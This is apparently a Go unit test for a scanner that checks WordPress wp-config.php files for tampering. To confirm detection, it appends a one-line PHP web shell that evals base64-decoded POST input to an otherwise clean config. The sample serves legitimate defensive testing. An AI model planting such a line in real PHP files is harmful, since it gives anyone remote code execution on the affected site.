package cmd

import (
	"encoding/base64"
	"encoding/json"
	"strings"
	"testing"
)

func TestWPConfigFindings(t *testing.T) {
	b64 := func(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }

	clean := `<?php
define('DB_NAME', 'wpdb');
define('DB_USER', 'wpuser');
define('DB_PASSWORD', 'REDACTED');
define('AUTH_KEY', 'REDACTED');
$table_prefix = 'wp_';
require_once ABSPATH . 'wp-settings.php';
`
	rawClean, _ := json.Marshal(map[string]any{
		"path":   "wp-config.php",
		"sha256": strings.Repeat("11", 32),
		"size":   len(clean),
		"b64":    b64(clean),
	})
	if f := wpConfigFindings(string(rawClean), "low"); len(f) != 0 {
		t.Errorf("clean wp-config.php must yield 0 findings, got %v", f)
	}

	infected := clean + "\n@eval(base64_decode($_POST['cmd']));\n"
	wantHash := strings.Repeat("22", 32)
	rawBad, _ := json.Marshal(map[string]any{
		"path":   "wp-config.php",
		"sha256": wantHash,
		"size":   len(infected),
		"b64":    b64(infected),
	})
	findings := wpConfigFindings(string(rawBad), "low")
	if len(findings) == 0 {
		t.Fatal("infected wp-config.php raised no findings")
	}
	for _, f := range findings {
		if f.Filename != "wp-config.php" {
			t.Errorf("filename = %q, want wp-config.php", f.Filename)
		}
		if f.ContentHash != wantHash {
			t.Errorf("content_hash = %q, want %q", f.ContentHash, wantHash)
		}
	}

	if wpConfigFindings("null", "low") != nil || wpConfigFindings("", "low") != nil || wpConfigFindings("bad", "low") != nil {
		t.Error("empty/null/malformed input must return nil")
	}
}
